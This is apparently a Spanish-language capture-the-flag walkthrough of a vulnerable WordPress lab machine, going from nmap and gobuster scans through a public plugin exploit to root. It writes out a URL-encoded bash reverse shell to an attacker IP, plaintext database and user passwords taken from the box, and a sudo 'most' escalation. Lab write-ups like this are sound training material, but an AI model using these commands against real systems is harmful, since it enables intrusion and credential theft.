
Como Primer paso Realizamos Reconocimiento  de la maquina  utilizando nmap -sV 192.168.100.158

![[Pasted image 20260922215947.png]]


ya que podemos observar que tenemos puerto 80 y 443 que son pagina web y puerto 3306 que es mysql  

como segundo paso vamos a realizar enumeración con la herramienta de gobuster  y usamos el siguiente comando 

gobuster dir -u http://192.168.100.158 -w /usr/share/wordlists/dirb/common.txt -t 50  

![[Pasted image 20260922220532.png]]
una vez encontramos vemos los siguiente que seria el dominio y wp-admin que una pagina wordpress 

el nombre de la pagina web  es http://aceituno.thl 
![[Pasted image 20260922220822.png]]

Y el siguiente comando 

wpscan --url http://aceituno.thl -e u 

En el código fuente vemos un plugin desactualizado y con mucho peligro.
![[Pasted image 20260922232208.png]]

donde vemos enumeracion de usuario 

![[Pasted image 20260922224212.png]]


primero realizamos la descargar de exploit  


Tras la versión del plugin encontrada nos encontramos con un [exploit](https://www.exploit-db.com/exploits/49967) en el cual tenemos que indicar la ruta donde esta instalado WordPress y la ruta de una publicación.


python3 49967.py  -u http://192.168.100.158/ -p /2024/04/23/hola-mundo/ 

![[Pasted image 20260922231847.png]]
al ejecutar obtenemos un webshell 

Vamos a ejecutar una revshell para obtener un mejor acceso a la maquina en este caso con «busybox»

Realizamos un nc y esperamos la conexion  
![[Pasted image 20260922232837.png]]

en la pagina web añadimos este comando 
en la url 

cmd=bash -c "sh -i >%26 %2Fdev%2Ftcp%2F192.168.100.91%2F443 0>%261"
![[Pasted image 20260922232918.png]]

una vez realizado la conexión realizamos los siguiente paso para tener una termina  integrativa 


una ves realizamos podemos  ejecutar  un terminar  interactivo con el siguiente comando   
```
SHELL=/bin/bash script -q /dev/null
```
una vez ingresado el siguiente comando  control +z 
y ingresamos el siguiente comando 
```
stty raw -echo && fg  
```
y luego exportarnos los demos  
para activar el control +l para limpliar 
y para borrar  comando 
```
 export TERM=xterm 
```
una vez realizado vamos ver si tenemos un binario para subir de privilegio 


una ves a dentro de equipo vamos a mover para busaca cualquier tipo de información para subir privilegio 

![[Pasted image 20260922233424.png]]

y encontramos conexión a la base de datos

![[Pasted image 20260922233607.png]]


realizamos el siguiente comando para ingresar la base de datos 
mysql -u wp_user -p -h localhost wordpress 

la contraseña : ' Tomamoreno '



![[Pasted image 20260922234931.png]]

con esta sentencia de sql pondemos uysuario y clave 
select *from pelopicopata;

y encontramos usuario y clave de la pagina web  

![[Pasted image 20260922235742.png]]
y esto es para elevar privilegio 
![[Pasted image 20260922235000.png]]

como puedoms ver 
usuario:  aceituno 
password: ElSeñorDeLaNoche


![[Pasted image 20260923000957.png]]

ejecutamos sudo -l para saber si hay un binario  ejecutando  

![[Pasted image 20260923005843.png]]

y revisando que si podemos ver el usuario con este  binario 

usamos sudo -u root /usr/bin/most /root/root.txt

nos sale lo siguiente presintamos la letra q para ejectar el el bin/bash 

![[Pasted image 20260923010114.png]]
y  este comando podemos hacer root y ver la bandera 

![[Pasted image 20260923005803.png]]